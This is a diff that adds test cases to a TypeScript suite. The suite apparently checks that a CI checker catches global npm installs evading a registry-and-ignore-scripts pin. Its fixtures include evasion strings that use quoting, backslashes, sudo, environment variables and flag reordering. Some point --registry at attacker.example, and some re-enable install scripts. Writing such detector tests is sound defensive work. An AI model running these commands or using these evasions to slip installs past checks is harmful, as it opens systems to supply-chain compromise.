@@ -806,6 +806,108 @@ describe("a global install names where the package comes from", () => {
       `npm install --global pnpm@10.0.0 && npm install --global ${PINNED} corepack@0.35.0`,
       /without --registry and --ignore-scripts|without --ignore-scripts and --registry/,
     ],
+    // Options in front of the subcommand: npm accepts them there, and the install was never
+    // inspected because the subcommand did not directly follow `npm`.
+    [
+      "-g in front of the subcommand",
+      "npm -g i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "--global in front of the subcommand",
+      "npm --global i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "-g in front of the long subcommand",
+      "npm -g install corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "--ignore-scripts=false in front of the subcommand",
+      `npm --ignore-scripts=false i -g --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /--ignore-scripts set to true/,
+    ],
+    [
+      "--global=true in front of the subcommand",
+      "npm --global=true i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a short cluster that ends in g",
+      "npm -fg i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a short cluster that starts with g",
+      "npm -gf i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "--location=global",
+      "npm install --location=global corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a spaced --location global",
+      "npm install --location global corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a command run through sudo",
+      "sudo npm i -g corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a command with a variable assignment in front",
+      "FOO=1 npm i -g corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a command behind then",
+      "if true; then npm i -g corepack@0.35.0; fi",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a command behind do",
+      "for v in 1; do npm i -g corepack@0.35.0; done",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "global requested through the environment of the command",
+      "npm_config_global=true npm i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "a quoted flag name before an attached false",
+      `npm i -g "--ignore-scripts"=false --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /--ignore-scripts set to true/,
+    ],
+    [
+      "empty quotes inside the flag name before an attached false",
+      `npm i -g --ignore-scripts''=false --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /--ignore-scripts set to true/,
+    ],
+    [
+      "a backslash before the equals sign of an attached false",
+      "npm i -g --ignore-scripts\\=false --registry https://registry.npmjs.org/ corepack@0.35.0",
+      /--ignore-scripts set to true/,
+    ],
+    [
+      "a quoted --registry flag name naming another host",
+      `npm i -g --ignore-scripts "--registry"=https://attacker.example/ corepack@0.35.0`,
+      /--registry naming a trusted registry/,
+    ],
+    [
+      "empty quotes inside the --registry flag name naming another host",
+      `npm i -g --ignore-scripts --registry''=https://attacker.example/ corepack@0.35.0`,
+      /--registry naming a trusted registry/,
+    ],
+    [
+      "a backslash before the equals sign of --registry naming another host",
+      "npm i -g --ignore-scripts --registry\\=https://attacker.example/ corepack@0.35.0",
+      /--registry naming a trusted registry/,
+    ],
   ] as const) {
     it(`reports a global install that evades the pin check: ${label}`, () => {
       const run = runWithPlantedCommand(command);
@@ -828,6 +930,20 @@ describe("a global install names where the package comes from", () => {
       "a local install beside a pinned global one",
       `npm install --no-audit && npm install --global ${PINNED} corepack@0.35.0`,
     ],
+    ["the pin in front of the subcommand", `npm ${PINNED} i -g corepack@0.35.0`],
+    [
+      "the global flag in front of the subcommand beside the pin",
+      `npm -g i ${PINNED} corepack@0.35.0`,
+    ],
+    ["a pinned install run through sudo", `sudo npm i -g ${PINNED} corepack@0.35.0`],
+    [
+      "a package argument carrying an expression after the boolean flag",
+      "npm install --global --registry https://registry.npmjs.org/ --ignore-scripts corepack@${{ env.COREPACK_VERSION }}",
+    ],
+    ["a global flag turned back off", "npm install -g --no-global corepack@0.35.0"],
+    ["--global=false", "npm install --global=false corepack@0.35.0"],
+    ["a -g after the argument terminator, which is a package name", "npm install -- -g"],
+    ["a message that quotes an unpinned install", 'echo "run npm i -g corepack@0.35.0"'],
   ] as const) {
     it(`accepts ${label}`, () => {
       const run = runWithPlantedCommand(command);
